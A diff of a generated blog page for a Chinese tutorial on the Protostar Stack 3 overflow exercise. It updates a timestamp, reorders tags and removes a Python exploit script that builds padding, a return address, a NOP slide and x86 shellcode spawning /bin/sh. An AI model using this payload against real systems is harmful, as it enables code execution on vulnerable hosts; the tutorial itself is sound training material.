@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-3.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-4.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-5.png?raw=true">
-<meta property="og:updated_time" content="2017-04-16T15:43:28.000Z">
+<meta property="og:updated_time" content="2017-04-16T15:45:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Protostar-栈溢出系列学习-Stack 3">
 <meta name="twitter:description" content="0x00 序前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。
@@ -209,7 +209,6 @@
 <p>测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。</p>
 </li>
 </ul>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import struct</div><div class="line">padding =  'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'</div><div class="line">ret  = struct.pack("I", 0x080484f9)</div><div class="line">eip_after_ret = struct.pack("I", 0xbffff78c+40)</div><div class="line">nopslide = '<span class="symbol">\x</span>90'*100</div><div class="line">payload = '<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>50<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>89<span class="symbol">\x</span>c1<span class="symbol">\x</span>89<span class="symbol">\x</span>c2<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>cd<span class="symbol">\x</span>80<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>40<span class="symbol">\x</span>cd<span class="symbol">\x</span>80'</div><div class="line">print padding+ret+eip_after_ret+nopslide+payload</div></pre></td></tr></table></figure>
 <p>这里的ret返回地址我们改为了<code>0x080484f9</code>正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。</p>
 <p>here we go!</p>
 <p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-0.png?raw=true" alt="3-0"></p>
@@ -465,6 +464,14 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">macOS内核</a>
               </li>
              
@@ -482,14 +489,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">IPC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
               </li>
              
               <li class="article-tag-list-item">
